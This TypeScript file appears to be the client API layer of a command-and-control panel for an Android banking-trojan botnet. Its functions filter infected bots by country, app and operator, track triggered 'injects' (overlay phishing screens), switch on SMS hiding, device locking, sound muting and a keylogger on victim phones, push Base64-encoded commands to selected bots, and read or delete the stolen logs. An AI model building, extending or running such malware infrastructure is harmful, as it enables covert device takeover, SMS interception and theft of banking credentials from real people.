import { ServerResponseType } from "../../../common/DataType";
import { api } from "../../../common/Utility";
import { Base64 } from "js-base64"

export const getBotTable = (page: number = 1, perPage: number = 10, botId: string = '', country: string = '', app: string = '', operator: string = '', online: boolean = false, offline: boolean = false, dead: boolean = false, hadInjects = false, hasNotInjects = false, triggeredInject = false) => {
  return new Promise((res, rej) => {
    const params = {
      type: 'getBotTable',
      page: page,
      perPage: perPage,
      botId: botId,
      country: country,
      app: app,
      operator: operator,
      online: online,
      offline: offline,
      dead: dead,
      hasInjects: hadInjects,
      hasNotInjects: hasNotInjects,
      triggeredInject: triggeredInject
    }

    api(params).done(res).catch(rej)
  })
}

export const getBotSetting = (botId: string) => {
  return new Promise((res, rej) => {
    const params = {
      type: 'getBotSetting',
      botId: botId,
    }

    api(params).done(res).catch(rej)
  })
}

export const setBotSetting = (botId: string, hideSms: boolean, lockDevice: boolean, offSound: boolean, keyLogger: boolean) => {
  return new Promise((res: (param: ServerResponseType) => void, rej) => {
    const params = {
      type: 'setBotSetting',
      botId: botId,
      hideSms: hideSms,
      lockDevice: lockDevice,
      offSound: offSound,
      keyLogger: keyLogger
    }

    api(params).done(res).catch(rej)
  })
}

export const getBotShow = (botId: string) => {
  return new Promise((res: (param: ServerResponseType) => void, rej) => {
    const params = {
      type: 'getBotShow',
      botId: botId
    }

    api(params).done(res).catch(rej)
  })
}

export const getMainStats = () => {
  return new Promise((res, rej) => {
    const params = {
      type: 'mainStats',
    }

    api(params).done(res).catch(rej)
  })
}

export const deleteBot = (selectedBots: string[]) => {
  return new Promise((res: (param: ServerResponseType) => void, rej) => {
    const params = {
      type: 'deleteBot',
      selectedBots: selectedBots
    }

    api(params).done(res).catch(rej)

  })
}

export const setCommand = (selectedBots: string[], command: string) => {
  return new Promise((res: (param: ServerResponseType) => void, rej) => {
    const params = {
      type: 'setCommand',
      selectedBots: selectedBots,
      command: Base64.encode(command)
    }

    api(params).done(res).catch(rej)
  })
}

export const setComment = (botId: string, comment: string) => {
  return new Promise((res: (param: ServerResponseType) => void, rej) => {
    const params = {
      type: 'setComment',
      botId: botId,
      comment: comment
    }

    api(params).done(res).catch(rej)
  })
}

export const getLog = (botId: string, logType: string) => {
  return new Promise((res, rej) => {
    const params = {
      type: 'getLog',
      botId: botId,
      logType: logType
    }

    api(params).done(res).catch(rej)
  })
}

export const deleteBotLog = (botId: string, logType: string) => {
  return new Promise((res: (param: ServerResponseType) => void, rej) => {
    const params = {
      type: 'deleteBotLog',
      botId: botId,
      logType: logType
    }

    api(params).done(res).catch(rej)
  })
}